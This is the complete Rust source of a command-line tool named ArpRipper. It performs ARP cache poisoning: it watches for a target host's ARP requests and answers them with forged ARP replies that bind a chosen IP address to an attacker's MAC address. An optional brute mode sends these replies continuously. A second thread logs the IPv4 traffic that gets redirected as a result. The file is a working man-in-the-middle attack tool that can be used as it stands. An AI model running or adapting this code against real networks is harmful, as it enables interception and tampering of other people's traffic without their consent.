use env_logger::Env;
use lazy_static::lazy_static;
use log::{debug, info};
use pnet::{
    datalink::{self, NetworkInterface},
    packet::{
        arp::{ArpHardwareTypes, ArpOperations, ArpPacket, MutableArpPacket},
        ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket},
        ipv4::Ipv4Packet,
        Packet,
    },
    util::MacAddr,
};
use std::{
    collections::HashMap,
    env,
    io::{prelude::*, stdin},
    net::Ipv4Addr,
    thread, time,
};
use structopt::StructOpt;

#[derive(StructOpt, Debug)]
struct Opt {
    /// IP of the host that receives arp packet
    #[structopt()]
    target_ip: String,

    /// MAC of the host that receives arp packet
    #[structopt()]
    target_mac: String,

    /// IP that will be polluted
    #[structopt()]
    sender_ip: String,

    /// The mac address in payload
    #[structopt()]
    sender_mac: String,

    /// Network interface(eg. eth0)
    #[structopt()]
    interface: String,

    /// Brute mode(just send packet at a fixed interval without waiting requests)
    #[structopt(short, long, requires("interval"))]
    brute: bool,

    /// The interval(ms) of brute mode
    #[structopt(short, long)]
    interval: Option<u64>,
}

lazy_static! {
    static ref TRANSLATION_ALL: HashMap<&'static str, HashMap<&'static str, &'static str>> = {
        let mut text = HashMap::new();
        let mut text_zh = HashMap::new();
        text_zh.insert("invalid_ip", "IP格式错误");
        text_zh.insert("invalid_mac", "MAC格式错误");
        text_zh.insert("arguments", "参数：");
        text_zh.insert("unknown_interface", "未找到网络接口：");
        text_zh.insert("press_enter_exit", "按回车退出");
        text_zh.insert("start", "开始");
        text_zh.insert("stop", "结束");
        text_zh.insert("start_brute_mode", "开始（爆破模式）");
        text_zh.insert("interval_is_undefinded", "爆破间隔未指定");
        text_zh.insert("vulnerable_arp_request_found", "发现可利用ARP请求包");
        text_zh.insert("malicious_response_sended", "发送恶意响应");
        text_zh.insert("arp_packet_found", "发现ARP包");
        text_zh.insert("redirected_packet_found", "发现被重定向的包");
        text.insert("zh", text_zh);
        let mut text_en = HashMap::new();
        text_en.insert("invalid_ip", "Invalid IP");
        text_en.insert("invalid_mac", "Invalid MAC");
        text_en.insert("arguments", "Arguments:");
        text_en.insert("unknown_interface", "Unknown interface");
        text_en.insert("press_enter_exit", "Press enter to exit");
        text_en.insert("start", "Start");
        text_en.insert("stop", "Stop");
        text_en.insert("start_brute_mode", "Start(Brute mode)");
        text_en.insert("interval_is_undefinded", "Interval is None");
        text_en.insert(
            "vulnerable_arp_request_found",
            "Vulnerable ARP request found.",
        );
        text_en.insert("malicious_response_sended", "Malicious response sended.");
        text_en.insert("arp_packet_found", "ARP packet found:");
        text_en.insert("redirected_packet_found", "Redirected packet found.");
        text.insert("en", text_en);
        text
    };
    static ref TRANSLATION: &'static HashMap<&'static str, &'static str> = {
        let lang = match env::var("LANG") {
            Ok(val) if val.starts_with("zh") => "zh",
            _ => "en",
        };
        &TRANSLATION_ALL[lang]
    };
}

fn main() {
    env_logger::Builder::from_env(Env::default().default_filter_or("debug"))
        .format_target(false)
        .format_timestamp(None)
        .init();

    let opt = Opt::from_args();
    let sender_ip: Ipv4Addr = opt
        .sender_ip
        .parse()
        .expect(&format!("{} {}", TRANSLATION["invalid_ip"], opt.sender_ip));
    let target_ip: Ipv4Addr = opt
        .target_ip
        .parse()
        .expect(&format!("{} {}", TRANSLATION["invalid_ip"], opt.target_ip));
    let sender_mac: MacAddr = opt.sender_mac.parse().expect(&format!(
        "{} {}",
        TRANSLATION["invalid_mac"], opt.sender_mac
    ));
    let target_mac: MacAddr = opt.target_mac.parse().expect(&format!(
        "{} {}",
        TRANSLATION["invalid_mac"], opt.target_mac
    ));
    debug!("{} {:#?}", TRANSLATION["arguments"], opt);

    let interface = datalink::interfaces()
        .iter()
        .filter(|i| i.name == opt.interface)
        .next()
        .expect(&format!(
            "{} {}",
            TRANSLATION["unknown_interface"], opt.interface
        ))
        .to_owned();
    let arp_ripper = ArpRipper {
        sender_ip,
        sender_mac,
        target_ip,
        target_mac,
        interface,
        brute_mode: opt.brute,
        brute_interval: opt.interval,
    };
    let cloned = arp_ripper.clone();
    thread::spawn(move || cloned.start());
    let cloned = arp_ripper.clone();
    thread::spawn(move || cloned.listen());

    info!("{}", TRANSLATION["press_enter_exit"]);
    stdin().bytes().next();
    info!("{}", TRANSLATION["stop"]);
}

#[derive(Clone, Debug)]
struct ArpRipper {
    sender_mac: MacAddr,
    sender_ip: Ipv4Addr,
    target_mac: MacAddr,
    target_ip: Ipv4Addr,
    interface: NetworkInterface,
    brute_mode: bool,
    brute_interval: Option<u64>,
}
impl ArpRipper {
    /// Start send malicious packet
    pub fn start(&self) -> ! {
        let (mut tx, mut rx) = match datalink::channel(&self.interface, Default::default()) {
            Ok(datalink::Channel::Ethernet(tx, rx)) => (tx, rx),
            Ok(_) => unreachable!(),
            Err(e) => panic!("Error in creating channel: {}", e),
        };
        if self.brute_mode {
            info!("{}", TRANSLATION["start_brute_mode"]);
            loop {
                tx.send_to(self.build_eth().packet(), Some(self.interface.clone()));
                thread::sleep(time::Duration::from_millis(
                    self.brute_interval
                        .expect(TRANSLATION["interval_is_undefinded"]),
                ));
            }
        } else {
            info!("{}", TRANSLATION["start"]);
            loop {
                match rx.next() {
                    Ok(raw_packet) => match EthernetPacket::new(raw_packet) {
                        Some(eth) => match eth.get_ethertype() {
                            EtherTypes::Arp => match ArpPacket::new(eth.payload()) {
                                Some(arp) => {
                                    if arp.get_sender_hw_addr() == self.target_mac
                                        && arp.get_operation() == ArpOperations::Request
                                        && arp.get_target_proto_addr() == self.sender_ip
                                    {
                                        let eth_packet = self.build_eth();
                                        tx.send_to(
                                            eth_packet.packet(),
                                            Some(self.interface.clone()),
                                        )
                                        .unwrap()
                                        .unwrap();
                                        info!("{}", TRANSLATION["vulnerable_arp_request_found"]);
                                        debug!("{:?}", arp);
                                        info!("{}", TRANSLATION["malicious_response_sended"]);
                                        debug!(
                                            "{:?}",
                                            ArpPacket::new(eth_packet.payload()).unwrap()
                                        );
                                    } else {
                                        debug!("{} {:?}", TRANSLATION["arp_packet_found"], arp);
                                    }
                                }
                                None => (),
                            },
                            _ => (),
                        },
                        None => (),
                    },
                    Err(e) => panic!("{}", e),
                }
            }
        }
    }

    /// Listen redirected ipv4 packet
    pub fn listen(&self) -> ! {
        let (_, mut rx) = match datalink::channel(&self.interface, Default::default()) {
            Ok(datalink::Channel::Ethernet(tx, rx)) => (tx, rx),
            Ok(_) => unreachable!(),
            Err(e) => panic!("Error in creating channel: {}", e),
        };
        loop {
            match rx.next() {
                Ok(raw_packet) => match EthernetPacket::new(raw_packet) {
                    Some(eth) => match eth.get_ethertype() {
                        EtherTypes::Ipv4 => match Ipv4Packet::new(eth.payload()) {
                            Some(ipv4) => {
                                if eth.get_source() == self.target_mac
                                    && eth.get_destination() == self.sender_mac
                                    && ipv4.get_destination() == self.sender_ip
                                {
                                    info!("{}", TRANSLATION["redirected_packet_found"]);
                                    debug!("{:?}", ipv4)
                                }
                            }
                            None => (),
                        },
                        _ => (),
                    },
                    None => (),
                },
                Err(e) => panic!("{}", e),
            }
        }
    }
    fn build_arp(&self) -> MutableArpPacket<'static> {
        let mut packet =
            MutableArpPacket::owned(vec![0u8; ArpPacket::minimum_packet_size()]).unwrap();
        packet.set_hardware_type(ArpHardwareTypes::Ethernet);
        packet.set_protocol_type(EtherTypes::Ipv4);
        packet.set_hw_addr_len(6);
        packet.set_proto_addr_len(4);
        packet.set_operation(ArpOperations::Reply);
        packet.set_sender_hw_addr(self.sender_mac);
        packet.set_sender_proto_addr(self.sender_ip);
        packet.set_target_hw_addr(self.target_mac);
        packet.set_target_proto_addr(self.target_ip);
        packet
    }
    fn build_eth(&self) -> MutableEthernetPacket<'static> {
        let eth_size = EthernetPacket::minimum_packet_size();
        let arp_size = ArpPacket::minimum_packet_size();
        let mut packet = MutableEthernetPacket::owned(vec![0u8; eth_size + arp_size]).unwrap();
        packet.set_ethertype(EtherTypes::Arp);
        packet.set_source(self.sender_mac);
        packet.set_destination(self.target_mac);
        packet.set_payload(self.build_arp().packet());
        packet
    }
}
